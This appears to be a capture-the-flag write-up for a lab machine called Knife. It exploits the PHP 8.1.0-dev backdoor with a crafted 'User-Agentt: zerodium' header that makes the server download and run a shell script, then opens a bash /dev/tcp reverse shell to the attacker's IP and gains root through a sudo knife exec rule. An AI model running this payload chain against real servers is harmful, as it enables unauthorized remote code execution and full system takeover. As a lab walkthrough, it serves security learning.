![KNIFE](banner.png)
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## User

The website unfortunately doesn't give you much. And finding this foothold will 100% takes the longest time for you. However when you look at the HTTP response in BurpSuite for example you might notice something strange about the php version. It says PHP/8.1.0-dev . Dev-versions often contain bugs or vulnerabilities that are not ment for public deployment.  

After researching we stumbled on this article: https://www.welivesecurity.com/2021/03/30/backdoor-php-source-code-git-server-breach/
and this one shortly after: https://arstechnica.com/gadgets/2021/03/hackers-backdoor-php-source-code-after-breaching-internal-git-server/

So attackers implemented a backdoor that can be used to execute php code which follows `zerodium` in the User-Agentt (mind the double T) Header of the http request to the server. We can use that to spawn a reverse shell when we send a http GET request containing this:

```
User-Agentt: zerodium exec("wget http://10.10.14.89:1234/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh");
```
make sure to host `python3 -m http.server 1234` and listen on 4242 depending on what you wrote in your shell.sh:

```
bash -i >& /dev/tcp/10.10.14.89/4242 0>&1
```


## Root

Root however is pwn in two minutes:

```
james@knife:/$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

so apparently we can use the ruby gem chef knife command as root.
Great it also has an exec parameter: https://docs-archive.chef.io/release/12-13/knife_exec.html

so we can simply run:

```
sudo /usr/bin/knife exec -E "exec '/bin/sh'"
```

to spawn a new shell with elevated privileges.
